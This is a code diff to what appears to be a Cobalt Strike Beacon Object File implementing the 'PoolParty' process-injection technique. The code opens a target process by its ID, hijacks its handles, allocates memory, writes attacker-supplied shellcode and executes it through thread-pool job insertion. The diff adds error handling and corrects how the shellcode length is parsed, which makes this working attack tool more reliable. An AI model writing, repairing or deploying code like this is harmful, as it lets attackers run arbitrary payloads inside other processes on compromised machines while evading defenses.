@@ -69,9 +69,20 @@ void HijackHandles() {
 void Inject() {
 	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Starting PoolParty attack against process id: %d", m_dwTargetPid);
 	m_p_hTargetPid = GetTargetProcessHandle();
+	if (m_p_hTargetPid == NULL) {
+		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	Cannot Open Process!");
+		return;
+	}
 	HijackHandles();
 	m_ShellcodeAddress = AllocateShellcodeMemory();
-	WriteShellcode();
+	if (m_ShellcodeAddress == NULL) {
+		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	AllocateShellcodeMemory Failed!");
+		return;	
+	}
+	if (!WriteShellcode()) {
+		BeaconPrintf(CALLBACK_ERROR, "[INFO] 	WriteShellcode Failed!");
+		return;	
+	}
 	RemoteTpJobInsertionSetupExecution();
 	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	PoolParty attack completed.");
 }
@@ -80,8 +91,7 @@ void go(char * args, int len) {
     datap parser;
     BeaconDataParse(&parser, args, len);
     m_dwTargetPid = BeaconDataInt(&parser);
-    m_szShellcodeSize = BeaconDataLength(&parser);
-    m_cShellcode = BeaconDataExtract(&parser, NULL);
-	BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Shellcode Size: %d bytes", m_szShellcodeSize);
-	Inject();
+    m_cShellcode = BeaconDataExtract(&parser, &m_szShellcodeSize);
+    BeaconPrintf(CALLBACK_OUTPUT, "[INFO] 	Shellcode Size: %d bytes", m_szShellcodeSize);
+    Inject();
 }
